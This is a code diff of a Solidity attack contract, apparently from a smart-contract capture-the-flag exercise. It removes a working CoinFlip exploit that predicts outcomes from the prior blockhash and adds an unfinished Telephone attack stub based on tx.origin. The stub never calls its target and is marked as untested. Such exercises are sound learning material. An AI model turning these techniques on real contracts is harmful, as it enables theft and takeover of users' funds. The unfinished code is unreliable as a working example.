@@ -1,26 +1,20 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "interfaces/icoinflip.sol";
+import "interfaces/itelephone.sol";
 
 contract Attack04 {
-    ICoinFlip private immutable target;
-    uint256 FACTOR =
-        57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    ITelephone private immutable target;
+    address private owner;
 
     constructor(address _target) {
-        target = ICoinFlip(_target);
+        owner = msg.sender;
+        target = ITelephone(_target); // ToDo - check it works
     }
 
-    function flip() external {
-        bool guess = _guess();
-        require(target.flip(guess), "guess failed");
-    }
-
-    function _guess() private view returns (bool) {
-        uint256 blockValue = uint256(blockhash(block.number - 1));
-        uint256 coinFlip = blockValue / FACTOR;
-        bool side = coinFlip == 1 ? true : false;
-        return side;
+    function changeOwner(address _owner) public {
+        if (tx.origin != msg.sender) {
+            owner = _owner;
+        }
     }
 }
